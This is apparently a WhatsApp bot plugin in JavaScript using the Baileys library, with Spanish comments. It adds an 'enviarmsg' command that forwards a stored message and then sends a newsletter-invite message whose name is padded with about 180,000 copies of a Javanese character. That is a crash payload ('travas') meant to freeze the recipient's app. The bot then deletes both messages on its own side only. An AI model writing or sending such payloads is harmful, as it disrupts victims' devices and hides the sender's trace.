import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    // Solo en chats privados
    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');

    // Solo el número del bot puede usarlo
    const normalize = jid => jid.split('@')[0];
    if (normalize(m.sender) !== normalize(conn.user.jid)) {
      return m.reply('❌ Solo el número del bot puede usar este comando.');
    }

    // Verificar archivo guardado
    if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return m.reply('❌ El archivo está dañado o incompleto.');

    // 1️⃣ Reenviar mensaje desde archivo
    const reenviado = await conn.copyNForward(m.chat, mensaje, true);

    // Eliminar localmente para el bot (no afecta al receptor)
    await conn.sendMessage(conn.user.id, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: reenviado.key.id,
        participant: conn.user.id
      }
    });

    // 2️⃣ Generar y enviar mensaje tipo canal
    const travas = 'ꦾ'.repeat(90000);
    const canalMessage = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const generado = await generateWAMessageFromContent(m.chat, canalMessage, {
      userJid: conn.user.id
    });

    await conn.relayMessage(m.chat, generado.message, { messageId: generado.key.id });

    // Eliminar también solo para el bot
    await conn.sendMessage(conn.user.id, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: generado.key.id,
        participant: conn.user.id
      }
    });

    // Confirmación
    await conn.sendMessage(m.chat, {
      text: '✅ Ambos mensajes fueron enviados y eliminados localmente solo para el bot.'
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['enviarmsg'];
export default handler;